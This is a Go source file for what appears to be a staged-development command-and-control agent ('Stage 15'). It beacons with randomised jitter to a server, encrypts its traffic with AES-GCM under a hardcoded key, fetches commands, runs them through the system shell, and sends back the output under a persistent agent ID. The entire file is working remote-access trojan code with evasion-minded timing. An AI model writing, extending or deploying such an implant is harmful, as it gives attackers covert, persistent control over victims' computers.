/*
AGENT — Stage 15 (Multi-Agent Identity)

What Stage 15 adds:
- Stable agent_id (UUID)
- agent_id sent with EVERY beacon

What does NOT change:
- State machine
- Encryption
- Command execution
- Timing / jitter
- Task handling

Design rule:
Agent identifies itself.
Server routes tasks.
*/

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// =============================
// CONFIG
// =============================

var serverURL = "http://127.0.0.1:8080/beacon"
var secretKey = []byte("01234567890123456789012345678901")

// Agent ID is generated ONCE
var agentID = loadOrCreateAgentID()

// =============================
// STATE MACHINE
// =============================

type AgentState int

const (
	IDLE AgentState = iota
	TASK_ASSIGNED
	TASK_EXECUTING
	TASK_REPORTED
)

// =============================
// PROTOCOL STRUCTS
// =============================

type Beacon struct {
	AgentID string `json:"agent_id"`
	Status  string `json:"status"`
	TaskID  string `json:"task_id,omitempty"`
	Output  string `json:"output,omitempty"`
}

type Task struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

// =============================
// PERSISTENT WORKING DIRECTORY
// =============================

var currentDir, _ = os.Getwd()

// =============================
// AGENT ID MANAGEMENT
// =============================

func loadOrCreateAgentID() string {
	const file = ".agent_id"

	// If agent_id already exists → reuse
	if data, err := os.ReadFile(file); err == nil {
		return strings.TrimSpace(string(data))
	}

	// Otherwise generate and store
	id := generateAgentID()
	_ = os.WriteFile(file, []byte(id), 0600)
	return id
}

// =============================
// ENCRYPTION
// =============================

func encrypt(data []byte) (string, error) {
	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(
		gcm.Seal(nonce, nonce, data, nil),
	), nil
}

func decrypt(enc string) ([]byte, error) {
	raw, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	return gcm.Open(nil, raw[:nonceSize], raw[nonceSize:], nil)
}

// =============================
// COMMAND EXECUTION
// =============================

func executeCommand(cmd string) string {

	// Handle cd internally
	if strings.HasPrefix(cmd, "cd ") {
		target := strings.TrimSpace(strings.TrimPrefix(cmd, "cd "))
		newDir := filepath.Join(currentDir, target)

		if err := os.Chdir(newDir); err != nil {
			return err.Error()
		}
		currentDir, _ = os.Getwd()
		return "Directory changed to " + currentDir
	}

	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}

	c.Dir = currentDir
	out, _ := c.CombinedOutput()
	return string(out)
}
func generateAgentID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)

	// UUID v4 format
	return fmt.Sprintf("%x-%x-%x-%x-%x",
		b[0:4],
		b[4:6],
		b[6:8],
		b[8:10],
		b[10:16],
	)
}

// =============================
// BEACON
// =============================

func beacon(b Beacon) *Task {

	raw, _ := json.Marshal(b)
	enc, err := encrypt(raw)
	if err != nil {
		return nil
	}

	body, _ := json.Marshal(map[string]string{"data": enc})
	resp, err := http.Post(serverURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var response map[string]string
	json.NewDecoder(resp.Body).Decode(&response)

	dec, err := decrypt(response["data"])
	if err != nil {
		return nil
	}

	var msg struct {
		Task *Task `json:"task"`
	}
	json.Unmarshal(dec, &msg)

	return msg.Task
}

// =============================
// JITTER
// =============================

func sleepJitter() {
	base := 10
	jitter := mrand.Intn(6) - 3
	time.Sleep(time.Duration(base+jitter) * time.Second)
}

// =============================
// MAIN LOOP
// =============================

func main() {
	fmt.Println("[*] Agent started (Stage 15)")
	fmt.Println("[*] Agent ID:", agentID)

	mrand.Seed(time.Now().UnixNano())

	state := IDLE
	var currentTask *Task
	var lastOutput string

	for {
		switch state {

		case IDLE:
			task := beacon(Beacon{
				AgentID: agentID,
				Status:  "alive",
			})

			if task != nil {
				currentTask = task
				state = TASK_ASSIGNED
			} else {
				sleepJitter()
			}

		case TASK_ASSIGNED:
			state = TASK_EXECUTING

		case TASK_EXECUTING:
			fmt.Println("[*] Executing:", currentTask.Cmd)
			lastOutput = executeCommand(currentTask.Cmd)
			state = TASK_REPORTED

		case TASK_REPORTED:
			beacon(Beacon{
				AgentID: agentID,
				Status:  "alive",
				TaskID:  currentTask.ID,
				Output:  lastOutput,
			})

			currentTask = nil
			lastOutput = ""
			state = IDLE
			sleepJitter()
		}
	}
}
